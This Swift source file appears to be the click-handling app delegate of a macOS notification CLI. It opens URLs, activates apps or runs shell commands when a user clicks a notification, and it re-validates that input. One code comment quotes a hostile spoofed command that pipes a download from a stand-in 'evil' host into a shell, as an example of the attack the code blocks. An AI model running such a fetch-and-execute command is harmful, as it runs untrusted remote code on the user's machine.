import AppKit
import Darwin
import Foundation
import os
import UserNotifications

/// Hosts the AppKit runloop and routes between two roles:
///
/// 1. **CLI mode.** Normal terminal invocation with one or more arguments.
///    Dispatches into `Roar.main()` once launch finishes.
///
/// 2. **Click-handler mode.** When the user clicks a previously delivered
///    notification, macOS re-launches this bundle with no extra arguments.
///    The `UNUserNotificationCenterDelegate` callback fires shortly after
///    launch with the activated notification's userInfo, and we then run
///    the side-effect (open URL, execute shell command, activate app)
///    before exiting.
///
/// The two paths race: the no-args branch starts a fallback timer that
/// would otherwise tear down an in-flight click-handler. The
/// coordination flags (`claimed`, the fallback Task handle) live behind
/// an `OSAllocatedUnfairLock` instead of on the main actor, because the
/// nonisolated `didReceive` entry point needs to claim the click and
/// cancel the fallback **synchronously**, before any actor hop. If the
/// flags lived only on the main actor, the fallback's `Task.sleep` could
/// wake before the click Task is enqueued, and the two main-actor Tasks'
/// scheduling order is not FIFO-guaranteed — the fallback would run
/// first, see `claimed == false`, and call `exit()`. The lock closes
/// that window with a single non-async write.
///
/// Annotating the class `@MainActor` enforces that the non-coordination
/// state is only touched on the main thread; the delegate callbacks are
/// already invoked there by AppKit / UserNotifications.
@MainActor
final class RoarAppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDelegate {

    /// How long to wait for `didReceive` after a no-args launch before
    /// assuming no click is pending and falling through to printing help.
    /// Cold-launched bundles (Gatekeeper, first activation after sleep)
    /// can take well over a second to dispatch the delegate callback —
    /// empirically the worst observed dispatch latencies on a busy
    /// system (Gatekeeper scan racing with first-after-sleep
    /// activation) cluster around 5–8 seconds. The earlier 3-second
    /// window was tight enough to drop legitimate clicks under those
    /// conditions; 10 seconds is comfortably above the observed tail
    /// while still feeling near-instant when there's nothing to wait
    /// for (the help text only prints after this timeout when
    /// `didReceive` truly never arrives).
    private static let clickHandlerArrivalTimeout: Duration = .seconds(10)

    /// How long to wait between calling the UN completion handler and
    /// terminating the process.
    ///
    /// What this is *actually* for under UN: the completion handler
    /// posts an XPC reply back to `usernoted`. The handler call itself
    /// is synchronous, but the XPC machinery flushes the reply on its
    /// own queue, so `exit()` immediately after the handler can race
    /// the flush and leave `usernoted` thinking the response handler
    /// abandoned. The 50ms window is several orders of magnitude
    /// larger than the actual XPC round-trip on a healthy system, but
    /// the side effects (open, activate, exec) already ran before this
    /// sleep, so the tail latency is invisible to the user.
    ///
    /// Asymmetric failure mode (a dropped click response is
    /// unrecoverable while a dropped send is retriable) keeps us
    /// conservative; 100ms of tail latency is invisible to the user —
    /// the open / exec / activate side effects already happened
    /// before this sleep. Tightening this further requires empirical
    /// measurement of the XPC reply timing under load (cold launch
    /// during Gatekeeper scan, post-sleep activation, etc.); the
    /// previous comment claimed 50ms was sufficient on visual
    /// inspection but no test pinned it.
    ///
    /// Verification path if regressions appear: post a notification
    /// with `--exec`, click it, then
    /// `log show --predicate 'eventMessage CONTAINS "io.myers.roar"' --last 1h`
    /// — `abandoned` / `expired` entries from `usernoted` mean the
    /// drain was insufficient and should be raised.
    ///
    /// Internal (not `private`) so the `clear` and `dismiss`
    /// subcommands share the same value — both call fire-and-forget
    /// UN APIs whose XPC reply has the same flush-race semantics as
    /// a click-response ack, and previously both hardcoded
    /// `.milliseconds(100)` with no reference to this constant.
    /// Tying them together here keeps a future tuning change visible
    /// in one place.
    ///
    /// `nonisolated` because `clear` / `dismiss` read it from their
    /// own `AsyncParsableCommand.run()` context (no actor), and the
    /// `Duration` value type is `Sendable`.
    nonisolated static let exitDrainDelay: Duration = .milliseconds(100)

/// Coordination state shared between the nonisolated `didReceive`
    /// callback and the main-actor fallback Task. See the class-level
    /// comment for why this lives behind a lock instead of on the main
    /// actor. `Sendable` because `Task` is.
    private struct ClickCoordination: Sendable {
        /// `true` once a click has been **terminally** routed (either
        /// fell through to the standard activate/exec/open pipeline as
        /// `.notInWaitMode`, or matched the `--wait` identifier as
        /// `.matchedWait`). The fallback Task checks this after its
        /// sleep and bails out without calling `exit()` if a click was
        /// already claimed.
        ///
        /// Critically: an *unrelated* click delivered during an active
        /// `--wait` (classification `.unrelatedDuringWait`) does NOT
        /// set this flag — the wait must remain receptive to the
        /// awaited click. The flag is therefore written by
        /// `routeResponse` only after classification, not by
        /// `didReceive` on every entry. `didReceive` reads it purely
        /// as a re-delivery idempotency guard for the SAME terminal
        /// click being announced twice by the framework boundary.
        var claimed: Bool = false
        /// The fallback Task started by the no-args branch. Held here
        /// so `didReceive` can cancel it synchronously, without an
        /// actor hop.
        var fallbackTask: Task<Void, Never>? = nil
    }

    /// Lock-protected click coordination state. `OSAllocatedUnfairLock`
    /// is the right shape here: short critical sections, no priority
    /// inversion concerns, and the only callers are the (rare) click
    /// arrival and the (single) fallback wake-up.
    private let coordination = OSAllocatedUnfairLock<ClickCoordination>(
        initialState: ClickCoordination())

    /// Guard so `scheduleExit` is idempotent. The function launches an
    /// un-tracked Task that calls `exit()`; without this flag, two
    /// invocations would race two `exit()` calls. Main-thread only.
    private var exitScheduled = false

    /// Identifier of the notification request whose response the
    /// current `Send --wait` invocation is awaiting, or `nil` when no
    /// wait is in progress. Clicks on notifications with a different
    /// identifier — older deliveries still sitting in NC, parallel
    /// sends from other processes, etc. — fall through to the
    /// standard `routeResponse` activate/exec/open pipeline rather
    /// than being silently consumed by this wait.
    ///
    /// Scoping by identifier instead of a bare `waitMode` flag is
    /// load-bearing: the flag-only design would have let a click on
    /// any unrelated notification "steal" the await and orphan the
    /// notification this Send actually posted.
    private var waitIdentifier: String?

    /// A `UNNotificationResponse` that arrived after
    /// `enableWaitMode(forRequest:)` was set but before any caller
    /// `await`ed `awaitNextResponse`. Without this buffer, an instant
    /// click (the user has the banner open from a sibling notification
    /// and clicks during the brief window between the enable and the
    /// `await`) would be lost. The first caller of
    /// `awaitNextResponse` drains this slot.
    private var pendingWaitResponse: UNNotificationResponse?

    /// Continuation parked by `awaitNextResponse` while no response
    /// has been buffered. Resumed exactly once — by `routeResponse`
    /// on a matching click (returning the response), or by
    /// `cancelWait()` on an external teardown (returning `nil`).
    /// `nil` whenever there is no active awaiter.
    ///
    /// The Optional payload lets `cancelWait` (called from a
    /// `--wait-timeout` Task) unblock the caller cleanly: a click
    /// resumes with `.some(response)`, a cancellation resumes with
    /// `.none`. Main-actor mutual exclusion keeps the
    /// read-then-resume / read-then-clear sequences from racing.
    private var waitContinuation: CheckedContinuation<UNNotificationResponse?, Never>?

    /// Test seam: when non-`nil`, `scheduleExit(code:)` invokes this
    /// closure instead of launching the `Task { exit(code) }` that
    /// would otherwise terminate the test process. Production code
    /// never sets this; tests assign a counter-incrementing closure
    /// to assert that "no exit was scheduled" on routing paths
    /// (e.g. an unrelated click delivered during an active `--wait`)
    /// where a leaked `scheduleExit` would orphan the wait and kill
    /// the parent invocation with no output.
    ///
    /// `@MainActor`-isolated alongside the rest of the routing state
    /// so the read-modify-write of `exitScheduled` and the hook call
    /// run serially on the main actor.
    var scheduleExitHook: ((Int32) -> Void)?

    func applicationWillFinishLaunching(_ notification: Notification) {
        // The UN delegate must be set before launch *finishes* so that
        // `didReceive` fires when the app is launched via a click —
        // moving this into `applicationDidFinishLaunching` would race
        // the first click-time callback and drop notifications.
        UNUserNotificationCenter.current().delegate = self
    }

    func applicationDidFinishLaunching(_ notification: Notification) {
        // XCTest loads the test bundle into this same app target and
        // appends its own arguments (`-NSTreatUnknownArgumentsAsOpen`,
        // `-XCTestSessionIdentifier`, etc.). Those would be parsed by
        // ArgumentParser as `send` flags and the test runner would die
        // with "Unknown option '-N'" before XCTest got a chance to
        // bootstrap. Detect the test environment and bow out.
        if ProcessInfo.processInfo.environment["XCTestConfigurationFilePath"] != nil {
            return
        }

        let args = CommandLine.arguments

        // No CLI args means either: (a) the user ran `roar` bare from
        // a shell, or (b) macOS launched us to handle a notification
        // click. Distinguish the two by parent pid: macOS re-launches
        // the bundle via launchd (pid 1) for click delivery. Any
        // other parent is a shell or supervising process, in which
        // case the user wants help text — printing immediately avoids
        // the 3-second wait that the click-arrival timeout would impose.
        if args.count <= 1 {
            guard getppid() == 1 else {
                print(Roar.helpMessage())
                exit(0)
            }
            let task = Task { @MainActor in
                try? await Task.sleep(for: Self.clickHandlerArrivalTimeout)
                let claimed = self.coordination.withLock { $0.claimed }
                if Task.isCancelled || claimed { return }
                print(Roar.helpMessage())
                exit(0)
            }
            coordination.withLock { $0.fallbackTask = task }
            return
        }

        Task { @MainActor in
            await Roar.main()
            exit(0)
        }
    }

    // MARK: - UNUserNotificationCenterDelegate

    // The protocol is not `@MainActor`-isolated, so conforming methods
    // on this `@MainActor` class have to be marked `nonisolated`. The
    // body of `didReceive` immediately hops back onto the main actor to
    // touch the main-actor-only state (notification content, exit
    // scheduling). The lock-protected `coordination` is touched
    // synchronously before that hop.

    /// Default options returned from `willPresent` when the notification
    /// did not carry an explicit `--foreground-presentation` override.
    ///
    /// `.list` is the macOS 11+ separation of "appears in Notification
    /// Center" from "shows a banner": the NSUserNotificationCenter-era
    /// API treated these as one decision, so the original port omitted
    /// `.list` and notifications fired in-process flashed a banner then
    /// vanished. In practice roar exits within ~100ms of `add(_:)`, so
    /// `willPresent` rarely fires — but when it does, omitting `.list`
    /// makes the notification disappear from NC and surprises users.
    ///
    /// `.badge` is the UN-era separation of "set the app-icon badge
    /// number" from the rest of the presentation surface. NS rolled
    /// badging into the notification post itself, so the original port
    /// omitted it — which meant a notification with `--badge-count`
    /// arriving while the bundle was still alive (the `--wait` case,
    /// or a click-handler relaunch racing a second notification) would
    /// post normally but never update the dock badge. Including
    /// `.badge` here lets the framework apply the content's `badge`
    /// value to the app icon as part of presentation.
    nonisolated static let defaultForegroundPresentationOptions:
        UNNotificationPresentationOptions = [.banner, .list, .sound, .badge]

    /// Allow notifications to display while this process is the foreground app.
    /// Without this, banner-style notifications may be suppressed.
    ///
    /// A sender can override the default option set per-notification by
    /// passing `--foreground-presentation <list>` at send time; the
    /// poster stashes the canonical serialised form in userInfo under
    /// `roar.present.options` and the parser here reads it back. On a
    /// missing key or malformed value the delegate falls through to
    /// `defaultForegroundPresentationOptions`, so notifications posted
    /// by older roar builds (or by any other process under the same
    /// bundle id with a value we cannot parse) keep their historical
    /// behaviour rather than surfacing a silent zero-option result.
    nonisolated func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        willPresent notification: UNNotification,
        withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void
    ) {
        let userInfo = notification.request.content.userInfo
        if let serialized = userInfo["roar.present.options"] as? String,
           let resolved = Send.deserializeForegroundPresentationOptions(serialized) {
            completionHandler(resolved)
            return
        }
        completionHandler(Self.defaultForegroundPresentationOptions)
    }

    /// Called when the user clicks a delivered notification, dismisses
    /// it explicitly, or triggers a custom action (none registered). The
    /// `userInfo` carries any `open` / `command` / `bundleID` payload we
    /// embedded at send time.
    nonisolated func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        didReceive response: UNNotificationResponse,
        withCompletionHandler completionHandler: @escaping () -> Void
    ) {
        // Cancel the no-args-fallback Task **synchronously**, before
        // any actor hop. Doing this in a `Task { @MainActor in }`
        // leaves a window where the fallback's `Task.sleep` can wake
        // first (Tasks on the same actor are not FIFO-ordered relative
        // to independently-spawned Tasks) and call `exit()` before the
        // click is recorded.
        //
        // The `claimed` *idempotency* check below covers the rare case
        // of the framework re-delivering the same terminal click;
        // setting the flag is the job of `routeResponse` because only
        // it knows whether the classification was actually terminal.
        // See `ClickCoordination.claimed` for why this matters during
        // `--wait` with an unrelated click.
        let alreadyClaimed = coordination.withLock { state -> Bool in
            state.fallbackTask?.cancel()
            return state.claimed
        }
        guard !alreadyClaimed else {
            // A previous terminal click is already being routed.
            // `scheduleExit` launches an un-tracked Task that calls
            // `exit()`, so letting two terminal clicks race through
            // would cause double-exit. Ack the framework here so the
            // re-delivery doesn't log abandoned.
            completionHandler()
            return
        }
        Task { @MainActor in
            await self.routeResponse(response, completionHandler: completionHandler)
        }
    }

    /// Test seam mirroring the `didReceive` claim-then-route shape but
    /// driving the wait classifier directly with primitives — used by
    /// `UnrelatedClickDuringWaitTests` to exercise the
    /// idempotency-guard / classifier interaction without instantiating
    /// the sealed `UNNotificationResponse`.
    ///
    /// Production callers should NOT use this; `didReceive` is the
    /// real entry point. The seam exists because regressions of the
    /// claim shape (e.g. claiming on `.unrelatedDuringWait`) cause a
    /// permanent hang of the awaited click, and the only honest test
    /// is one that drives the same claim/idempotency path the framework
    /// drives at runtime.
    ///
    /// - Parameters:
    ///   - receivedIdentifier: The notification request identifier
    ///     the framework delivered the click for.
    ///   - completionHandler: The UN completion-handler analogue.
    /// - Returns: The classification the inner `classifyAndConsumeWaitClick`
    ///   produced, plus a boolean recording whether the click was
    ///   short-circuited by the idempotency guard (the framework's
    ///   re-delivery branch). When `idempotencyDropped == true`,
    ///   `classification` is `nil` because no classification ran.
    @MainActor
    func simulateDidReceiveForTests(
        receivedIdentifier: String,
        completionHandler: @escaping () -> Void
    ) -> (classification: WaitClickClassification?, idempotencyDropped: Bool) {
        // Mirror `didReceive`'s synchronous pre-flight: cancel the
        // fallback task (a no-op in tests where none is installed)
        // and read the claim flag.
        let alreadyClaimed = coordination.withLock { state -> Bool in
            state.fallbackTask?.cancel()
            return state.claimed
        }
        if alreadyClaimed {
            completionHandler()
            return (classification: nil, idempotencyDropped: true)
        }
        // Mirror `routeResponse`'s claim-on-terminal rule. The
        // matched-response payload is `nil` here because the test seam
        // does not carry one; `classifyAndConsumeWaitClick`'s
        // documented nil-defence handles that on the matched branch.
        let classification = classifyAndConsumeWaitClick(
            receivedIdentifier: receivedIdentifier,
            matchedResponse: nil,
            completionHandler: completionHandler
        )
        switch classification {
        case .matchedWait, .notInWaitMode:
            coordination.withLock { $0.claimed = true }
        case .unrelatedDuringWait:
            break
        }
        return (classification: classification, idempotencyDropped: false)
    }

    /// Switch this delegate into `--wait` mode for a specific
    /// notification request. Only clicks whose response refers to
    /// `identifier` will short-circuit the activate / exec / open
    /// routing; other clicks (e.g. on older notifications still in
    /// NC) fall through to the standard pipeline.
    ///
    /// Called by `Send.run()` *before* `add(_:)` so an instant click
    /// (cached banner, accessibility automation) doesn't race the
    /// subscription.
    @MainActor
    func enableWaitMode(forRequest identifier: String) {
        waitIdentifier = identifier
    }

    /// Unblock a parked `awaitNextResponse` with `nil`, signalling
    /// external teardown (e.g. `--wait-timeout` elapsed). Called from
    /// a sibling Task in `Send.run()`.
    ///
    /// Race safety: this and `routeResponse` are both `@MainActor`, so
    /// they run serially. Whichever runs first reads `waitContinuation`,
    /// nils it, and resumes — the other sees `nil` and does nothing.
    /// That prevents the double-resume trap that `CheckedContinuation`
    /// would otherwise fire.
    @MainActor
    func cancelWait() {
        waitIdentifier = nil
        pendingWaitResponse = nil
        if let continuation = waitContinuation {
            waitContinuation = nil
            continuation.resume(returning: nil)
        }
    }

    /// Suspend until a response arrives whose `request.identifier`
    /// matches the one passed to `enableWaitMode(forRequest:)`, or
    /// until `cancelWait()` is called. Returns the response on a
    /// match, `nil` on an external teardown.
    ///
    /// If a matching response has already been buffered (race between
    /// `enableWaitMode` and the first await), drains the buffer
    /// synchronously and returns immediately. Clears wait state on
    /// return so the delegate is ready for the next invocation in
    /// the unlikely scenario of a reused process.
    ///
    /// The continuation is `CheckedContinuation` rather than the
    /// unchecked form so a programming error (resuming twice) traps
    /// with a clear message instead of silently misbehaving.
    @MainActor
    func awaitNextResponse() async -> UNNotificationResponse? {
        if let pending = pendingWaitResponse {
            pendingWaitResponse = nil
            waitIdentifier = nil
            return pending
        }
        // Defence-in-depth: if `cancelWait()` already ran (e.g. the
        // wait-timeout Task raced ahead of this await on the main
        // actor — a race the production 1s timeout floor makes
        // practically impossible, but a future caller that injects
        // a sub-second timeout or that calls `cancelWait` before
        // ever awaiting could still trip), there is no awaitable
        // event left in the system: no notification is pending and
        // no continuation will be resumed by the routing path.
        // Parking a fresh continuation here would block forever —
        // surface the "already torn down" state immediately
        // instead. The condition mirrors the post-cancel quiescent
        // state set by `cancelWait` (`waitIdentifier == nil` AND
        // `pendingWaitResponse == nil`).
        guard waitIdentifier != nil else {
            return nil
        }
        let response: UNNotificationResponse? = await withCheckedContinuation { continuation in
            waitContinuation = continuation
        }
        waitIdentifier = nil
        return response
    }

    /// Classification of an incoming click against the current
    /// `waitIdentifier` state. Returned by
    /// `classifyAndConsumeWaitClick` so the caller knows whether to
    /// fall through to the standard activate/exec/open pipeline
    /// (`.notInWaitMode`), do nothing further because the wait was
    /// satisfied (`.matchedWait`), or do nothing further because the
    /// click was for an unrelated notification and the wait must
    /// remain parked (`.unrelatedDuringWait`).
    enum WaitClickClassification: Sendable, Equatable {
        case notInWaitMode
        case matchedWait
        case unrelatedDuringWait
    }

    /// Inspect an incoming click against the current wait state and
    /// consume the wait-related bookkeeping when appropriate. Pulled
    /// out of `routeResponse` so:
    ///
    /// 1. The unrelated-during-wait branch — which must ack the
    ///    completion handler but NOT activate / exec / open / exit —
    ///    has a single named place to live with its own comment.
    /// 2. Tests can drive it without constructing a sealed
    ///    `UNNotificationResponse`; the matched response is passed in
    ///    as an optional, and is only used when the identifier
    ///    actually matches.
    ///
    /// Decision matrix:
    ///
    /// | `waitIdentifier` | identifiers match | Outcome |
    /// |------------------|-------------------|---------|
    /// | `nil`            | n/a               | `.notInWaitMode` (no side effects here) |
    /// | non-`nil`        | yes               | ack, resume continuation or buffer, return `.matchedWait` |
    /// | non-`nil`        | no                | ack only, return `.unrelatedDuringWait` |
    ///
    /// The `.unrelatedDuringWait` policy is a deliberate choice. A
    /// non-wait click handler would normally activate/exec/open from
    /// userInfo, but this process is *dedicated* to a specific wait.
    /// Running the side effects would either:
    ///
    /// * Race the in-flight wait (two `scheduleExit`s, one of which
    ///   would kill the parent invocation before its target click
    ///   arrives), or
    /// * Block the wait while a `--exec` command runs (up to
    ///   `ShellExecutor.shellCommandTimeout`).
    ///
    /// Neither is what the `--wait` caller asked for. The user opted
    /// into a specific notification's response; an unrelated click
    /// is treated as best-effort acknowledgment and dropped on the
    /// floor. The original notification's own click handler will fire
    /// in a freshly-launched process (the user can click it again
    /// after the wait resolves).
    ///
    /// - Parameters:
    ///   - receivedIdentifier: `response.notification.request.identifier`.
    ///   - matchedResponse: The full `UNNotificationResponse`,
    ///     consulted only when `receivedIdentifier` matches
    ///     `waitIdentifier` (continuation resume needs the typed
    ///     payload). Optional so tests can exercise the
    ///     `.unrelatedDuringWait` path without instantiating a
    ///     sealed framework type.
    ///   - completionHandler: The UN completion handler. Always
    ///     called from this method when a wait is active; the
    ///     `.notInWaitMode` branch defers the ack to the caller's
    ///     downstream router (which has its own ack-after-side-effects
    ///     watchdog discipline).
    /// - Returns: The classification so the caller can decide whether
    ///   to continue with the standard routing.
    @MainActor
    func classifyAndConsumeWaitClick(
        receivedIdentifier: String,
        matchedResponse: UNNotificationResponse?,
        completionHandler: @escaping () -> Void
    ) -> WaitClickClassification {
        guard let waitIdentifier else { return .notInWaitMode }
        guard receivedIdentifier == waitIdentifier else {
            // Ack so the framework's response-handler watchdog doesn't
            // log this delivery as abandoned. Drop the activation:
            // the wait owns this process's exit path, and running a
            // side effect here would either race the eventual wait
            // resume or block it behind `--exec`. See the method-level
            // docstring for the full rationale.
            completionHandler()
            return .unrelatedDuringWait
        }
        completionHandler()
        if let continuation = waitContinuation {
            waitContinuation = nil
            if let matchedResponse {
                continuation.resume(returning: matchedResponse)
            } else {
                // Defensive: a `nil` matched response on the
                // matched-identifier branch shouldn't happen from the
                // real call site (`routeResponse` always passes the
                // real response). If a future caller breaks the
                // invariant we cancel the wait cleanly instead of
                // trapping or stranding the awaiter.
                continuation.resume(returning: nil)
            }
            return .matchedWait
        }
        // No awaiter yet — buffer for the first `awaitNextResponse`
        // caller. Same nil-defence as above.
        if let matchedResponse {
            pendingWaitResponse = matchedResponse
        }
        return .matchedWait
    }

    /// Main-actor-isolated continuation of `didReceive`. Splitting this
    /// out keeps the nonisolated delegate method trivial and concentrates
    /// the actor hop in one place.
    ///
    /// Click claim is single-sourced here: the `claimed` flag is set
    /// only when the classifier reports a *terminal* outcome
    /// (`.notInWaitMode` exits via `scheduleExit`; `.matchedWait`
    /// resumes the wait and exits via `Send.run`'s post-await path).
    /// `.unrelatedDuringWait` is non-terminal — the wait must stay
    /// receptive to the awaited click — and therefore must NOT claim,
    /// otherwise a stale unrelated notification arriving first would
    /// poison the idempotency guard in `didReceive` and the awaited
    /// click would be silently dropped (hangs forever absent
    /// `--wait-timeout`).
    @MainActor
    private func routeResponse(
        _ response: UNNotificationResponse,
        completionHandler: @escaping () -> Void
    ) async {
        // `--wait` mode pre-empts the standard routing. The
        // classification helper handles both the matching-identifier
        // resume *and* the unrelated-identifier ack-only drop; only
        // when the helper reports `.notInWaitMode` do we fall through
        // to the activate/exec/open pipeline below.
        switch classifyAndConsumeWaitClick(
            receivedIdentifier: response.notification.request.identifier,
            matchedResponse: response,
            completionHandler: completionHandler
        ) {
        case .matchedWait:
            // Terminal: `Send.run`'s `awaitNextResponse` consumer
            // owns the exit path. Mark the click claimed so a
            // re-delivery of the same response by the framework is
            // dropped by the idempotency guard in `didReceive`.
            coordination.withLock { $0.claimed = true }
            return
        case .unrelatedDuringWait:
            // Non-terminal: the wait must stay receptive to the
            // awaited click. Deliberately do NOT claim — see method
            // docstring for the failure mode (permanent hang) that
            // claiming here would cause.
            return
        case .notInWaitMode:
            // Falls through to the activate/exec/open pipeline below,
            // which terminates via `scheduleExit`. Claim now so the
            // framework's re-delivery (rare but real) hits the
            // idempotency guard in `didReceive`.
            coordination.withLock { $0.claimed = true }
        }
        switch response.actionIdentifier {
        case UNNotificationDefaultActionIdentifier:
            await handleActivation(response: response, completionHandler: completionHandler)

        case UNNotificationDismissActionIdentifier:
            // Explicit dismissal from the user. Skip side effects but
            // still ack and exit — the framework only invokes this
            // delegate after a click-mode launch, so there's no other
            // terminator.
            handleNonActivationResponse(completionHandler: completionHandler)

        default:
            // No custom `UNNotificationAction`s are registered, so this
            // branch shouldn't fire in practice. Treat unknown actions
            // the same as dismissal: ack, clean up, exit. An assertion
            // makes the case obvious during development without crashing
            // an end-user's click handler.
            assertionFailure("Unexpected actionIdentifier: \(response.actionIdentifier)")
            handleNonActivationResponse(completionHandler: completionHandler)
        }
    }

    /// Ack a dismissal (or unexpected action) and schedule process exit.
    /// Click claim / fallback cancellation already happened in
    /// `didReceive`.
    private func handleNonActivationResponse(completionHandler: @escaping () -> Void) {
        completionHandler()
        scheduleExit(code: 0)
    }

    /// Run the embedded side-effects (activate / execute / open).
    ///
    /// `completionHandler` is invoked **before** the side effects run.
    /// The UN framework treats the handler as a watchdog: if it isn't
    /// called within ~30 s the response is logged as abandoned. A long
    /// `--exec` command (a build, a slow upload) would easily exceed
    /// that, so ack first and do the work afterwards. The ack only
    /// signals "we received the click"; it does not commit the process
    /// to keeping the side effect alive, which `scheduleExit` and the
    /// drain delay handle.
    ///
    /// Click claim / fallback cancellation already happened in
    /// `didReceive`.
    ///
    /// - Parameters:
    ///   - response: The user's notification response.
    ///   - completionHandler: The UN framework continuation.
    @MainActor
    private func handleActivation(
        response: UNNotificationResponse,
        completionHandler: @escaping () -> Void
    ) async {
        let content = response.notification.request.content
        let userInfo = content.userInfo
        // Read only the namespaced, action-grouped keys. Anything
        // written under bare `command` / `open` / `bundleID` (or the
        // pre-grouping `roar.command` / `roar.open` / `roar.bundleID`)
        // by an older build, a fork, or any other app posting against
        // this bundle id is ignored — see Send.swift for the rationale.
        // Click-time userInfo is treated as untrusted input — a
        // same-bundle-id sibling process (or an older build, or any
        // future caller) can post a notification with any payload
        // under our bundle id. The send-time validators are the
        // source of truth; we replay them here on a per-field basis
        // and drop the side effect if a field doesn't survive
        // re-validation. The downstream branches (`activateApp`,
        // `openClickURL`, the `--exec` block) carry their own
        // ROAR_DEBUG-gated diagnostics for the user-visible
        // failures; the read sites just normalise the typed value.
        //
        // `bundleID`: re-run the send-time `validateActivateBundleID`
        // so a spoofed `\0`-bearing or whitespace-only value drops
        // here rather than reaching `urlForApplication`.
        let bundleID = (userInfo["roar.activate.bundleID"] as? String)
            .flatMap { try? Send.validateActivateBundleID($0) }
        // `command`: kept as the RAW value so the downstream branch
        // can run its own NUL re-check and surface a debug diagnostic
        // naming the specific reason. Filtering here would silently
        // swallow a NUL-bearing command with no log entry.
        let command = userInfo["roar.exec.command"] as? String
        let commandOptIn = (userInfo["roar.exec.consent"] as? String) == "1"
        let open = userInfo["roar.open.url"] as? String
        // The send-time path serialises the exact allow-list it
        // validated against into `roar.open.allowedSchemes`. Read it
        // back here and pass to `openClickURL` so the click handler
        // never broadens what the send agreed to. A garbled / missing
        // value (same-bundle-id spoofer scribbling, older build,
        // serialiser drift) deserialises to `nil`, in which case
        // `openClickURL` falls back to the default web/email
        // allow-list — strictly narrower than whatever the spoofer
        // tried to inject.
        let openUrlAllowList: Set<String>? = (userInfo["roar.open.allowedSchemes"] as? String)
            .flatMap { URLValidation.deserializeAllowList($0) }

        // Ack the framework before running any side effect so the
        // response handler watchdog never expires on us.
        completionHandler()

        // Notification body / URL / command can carry sensitive data
        // (credentials in `curl -u user:pass …`, tokens in query
        // strings). Don't write them to stderr unless explicitly opted
        // in — stderr from a launchd-relaunched bundle ends up in the
        // unified log.
        ClickSideEffects.debugStderr("""
            User activated notification:
                title: \(content.title)
             subtitle: \(content.subtitle)
              message: \(content.body)
            bundle ID: \(bundleID ?? "")
              command: \(command ?? "")
              opt-in?: \(commandOptIn)
                 open: \(open ?? "")
             allow: \(openUrlAllowList.map { $0.sorted().joined(separator: ",") } ?? "default")

            """)

        // Side-effect order: activate first (snappy AppKit call), then
        // open (NSWorkspace hand-off), then execute (potentially up to
        // `ShellExecutor.shellCommandTimeout` long). Running `open`
        // before `execute` keeps URL hand-off prompt even when the
        // user wires up a slow shell command.
        if let bundleID {
            guard await ClickSideEffects.activateApp(bundleID: bundleID) else {
                scheduleExit(code: 1)
                return
            }
        }

        if let open {
            guard ClickSideEffects.openClickURL(
                open, allowedSchemes: openUrlAllowList) else {
                scheduleExit(code: 1)
                return
            }
        }

        if let command {
            // Refuse to execute a command that wasn't sent with the
            // explicit `--allow-shell-on-click` opt-in. Defence in
            // depth against a notification posted by an older build /
            // fork / spoofer that only sets `roar.exec.command`.
            //
            // Also refuse a command containing a NUL byte. `posix_spawn`
            // builds argv with `strdup`, which truncates at NUL — a
            // hostile same-bundle-id notification posting
            // `roar.exec.command = "curl evil|sh\0echo ok"` would silently
            // run the malicious prefix while the value visible to the
            // user shows the innocent suffix (and vice versa). The
            // send-time validator already rejects NUL in `--exec`;
            // re-checking at click time covers spoofed userInfo from
            // any process that knows the bundle id.
            //
            // A refusal forces `success = false` regardless of whether
            // activate / open earlier returned true. This *does*
            // clobber the prior AND-chain — the exit code reflects
            // whether the whole click was handled cleanly, and a
            // refused command is by definition not clean. The user
            // can still tell which step failed via `ROAR_DEBUG`-gated
            // stderr above.
            let success: Bool
            if !commandOptIn {
                ClickSideEffects.debugStderr(
                    "Refusing to run notification command: consent flag missing.\n")
                success = false
            } else if !ShellExecutor.isClickCommandSafe(command) {
                ClickSideEffects.debugStderr(
                    "Refusing to run notification command containing a NUL byte.\n")
                success = false
            } else {
                // The `@Sendable` closure wrappers are not noise: the
                // Swift 5 strict-concurrency compiler refuses to
                // coerce a bare `nonisolated static func` reference
                // into an `@Sendable (...) -> Void` parameter
                // ("converting non-Sendable function value... may
                // introduce data races"), even though the underlying
                // functions only touch thread-safe globals
                // (`ProcessInfo`, `FileHandle.standardError`). The
                // wrappers re-stamp the Sendable bit at the call site
                // so the executor's detached watchdog body can invoke
                // them without an actor hop.
                success = await ShellExecutor.runShell(
                    command: command,
                    debugStderr: { @Sendable msg in
                        ClickSideEffects.debugStderr(msg)
                    },
                    debugOrBriefStderr: { @Sendable detail, brief in
                        ClickSideEffects.debugOrBriefStderr(
                            detail: detail, brief: brief)
                    }
                )
            }
            
            guard success else {
                scheduleExit(code: 1)
                return
            }
        }

        scheduleExit(code: 0)
    }

    /// Schedule process exit after a small delay so the UN framework's
    /// XPC ack has time to flush. Calling `exit` synchronously (or even
    /// one runloop tick later via `DispatchQueue.main.async`) can race
    /// the ack on busy systems and result in the framework treating the
    /// response as abandoned.
    ///
    /// When `scheduleExitHook` is set, the call is forwarded to it and
    /// the real exit is suppressed — this is the test seam that lets
    /// the routing tests verify "no exit was scheduled on this path"
    /// without having to wait for a real `exit()` to fire.
    /// `exitScheduled` is set even on the hook path so a double-call
    /// surfaces in the hook counter (the production idempotency rule
    /// applies to tests too: a routing change that double-schedules
    /// would fail the test rather than appearing to pass).
    private func scheduleExit(code: Int32) {
        guard !exitScheduled else { return }
        exitScheduled = true
        if let scheduleExitHook {
            scheduleExitHook(code)
            return
        }
        Task { @MainActor in
            try? await Task.sleep(for: Self.exitDrainDelay)
            exit(code)
        }
    }

    // Activation side effects (activateApp / openClickURL /
    // waitForActivation / debugStderr / debugOrBriefStderr) live in
    // `Sources/ClickSideEffects.swift`. They touched no `self`
    // state on the delegate, so the extraction reduces this file
    // from a 7-concern omnibus to just the click-routing /
    // wait-mode / lifecycle pieces.

}
